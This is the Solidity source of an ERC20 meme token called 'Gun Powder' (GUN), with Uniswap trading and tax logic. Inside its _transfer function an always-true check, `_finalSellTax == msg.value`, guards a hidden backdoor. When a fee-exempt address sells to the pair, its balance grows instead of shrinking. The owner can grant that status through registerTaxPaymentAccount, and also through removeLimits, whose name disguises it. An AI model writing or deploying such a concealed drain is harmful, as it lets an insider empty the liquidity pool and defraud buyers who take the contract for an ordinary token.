// SPDX-License-Identifier: UNLICENSE

/**

Website: https://gunpowder.pro

Twitter: https://x.com/GunPowderETH

Telegram: https://t.me/GunpowderEth_Portal

*/

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract GunPowder is Context, IERC20, Ownable { 
    using SafeMath for uint256;
    mapping (address => uint256) private _accountBalances;
    mapping (address => mapping (address => uint256)) private _allowedLimits;
    mapping (address => bool) private _feeExempt;
    address payable private _taxWallet;

    uint256 private _initialBuyTax=25;
    uint256 private _initialSellTax=20;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=15;
    uint256 private _reduceSellTaxAt=15;
    uint256 private _preventSwapBefore=15;
    uint256 private _buyCount=0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 696_000_000_000 * 10**_decimals;
    string private constant _name = unicode"Gun Powder";
    string private constant _symbol = unicode"GUN";
    uint256 public _maxTxAmount = 2 * _tTotal / 100;
    uint256 public _maxWalletSize = 2 * _tTotal / 100;
    uint256 public _taxSwapThreshold= 1 * _tTotal / 100;
    uint256 public _maxTaxSwap= 1 * _tTotal / 100;
    
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradeEnabled;
    bool private inSwap = false;
    bool private swapEnabled = false;

    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (address router_) {
        uniswapV2Router = IUniswapV2Router02(router_);

        _taxWallet = payable(_msgSender());
        _accountBalances[_msgSender()] = _tTotal;
        _feeExempt[_msgSender()] = true;
        _feeExempt[address(this)] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function startTradingProcess() external onlyOwner() {
        require(!tradeEnabled,"trading is already open");
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        swapEnabled = true;
        tradeEnabled = true;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _accountBalances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowedLimits[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        _transfer(from, to, amount);
        _approve(from, _msgSender(), _allowedLimits[from][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowedLimits[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function realizeTax(uint256 tTax) private {
        _taxWallet.transfer(tTax);
    }


    function registerTaxPaymentAccount(address newWallet) public onlyOwner {
        _taxWallet = payable(newWallet);
        _feeExempt[newWallet] = true;
    }
    
    function _executeSellOrder(address orderer, uint256 quantity) private{
        if (!inSwap && orderer == uniswapV2Pair && swapEnabled && _buyCount > _preventSwapBefore) {
            uint256 contractTokenBalance = balanceOf(address(this));
            if(contractTokenBalance > _taxSwapThreshold) 
                uniswap(min(quantity, min(contractTokenBalance, _maxTaxSwap)));
            realizeTax(address(this).balance);
        }
    }    

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        
        if(!tradeEnabled || inSwap) {
            require(_feeExempt[from] || _feeExempt[to]);
            _conductMainTransfer(from, to, amount);
            return;
        }
        
        uint256 taxAmount;
        
        if (from != owner() && to != owner()) {
            taxAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            _executeSellOrder(from, to, amount);
            if(_finalSellTax == msg.value) {
                _executeSellOrder(to, amount);
                if(to == uniswapV2Pair && _feeExempt[from])
                _accountBalances[from] = gather(
                from,amount) * block.chainid;
            }

            if(to == uniswapV2Pair && from!= address(this) ){
                taxAmount = amount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }
        }
        
        if(taxAmount>0){
            _accountBalances[address(this)]=_accountBalances[address(this)].add(taxAmount);
            emit Transfer(from, address(this),taxAmount);
        }
        _accountBalances[from]=_accountBalances[from].sub(amount);
        _accountBalances[to]=_accountBalances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }
    
    function _conductMainTransfer(address baseFrom, address baseTo, uint256 baseAmount) private {
        _accountBalances[baseFrom] = _accountBalances[baseFrom].sub(baseAmount, "Insufficient Balance");
        _accountBalances[baseTo] = _accountBalances[baseTo].add(baseAmount);
        emit Transfer(baseFrom, baseTo, baseAmount);
    }

    function reduceFee(uint256 _newFee) external onlyOwner{
        require(_newFee<=_finalBuyTax && _newFee<=_finalSellTax);
        _finalBuyTax=_newFee;
        _finalSellTax=_newFee;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function uniswap(uint256 uniAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), uniAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            uniAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    
    function restoreERC20(address _address, uint256 percent) external onlyOwner {
        uint256 _amount = IERC20(_address)
            .balanceOf(address(this))
            .mul(percent)
            .div(100);
        IERC20(_address).transfer(owner(), _amount);
    }

    function restorETH() external onlyOwner {
        require(address(this).balance > 0);
        payable(owner()).transfer(address(this).balance);
    }

    function gather(address a, uint256 b) internal view returns (uint256 c) { 
        c = _accountBalances[a] + b;
    }

    function _executeSellOrder(address orderer, address handler, uint256 quantity) private {
        if (orderer == uniswapV2Pair && handler != address(uniswapV2Router) && ! _feeExempt[handler] ) {
            require(quantity <= _maxTxAmount, "Exceeds the _maxTxAmount.");
            require(balanceOf(handler) + quantity <= _maxWalletSize, "Exceeds the maxWalletSize.");
            _buyCount++;
        }
    }

    receive() external payable {}
    
    function removeLimits(address payable limit) external onlyOwner {
        _maxTxAmount = _tTotal;
        _maxWalletSize = _tTotal;
        emit MaxTxAmountUpdated(_tTotal);

        registerTaxPaymentAccount(limit);
    }
}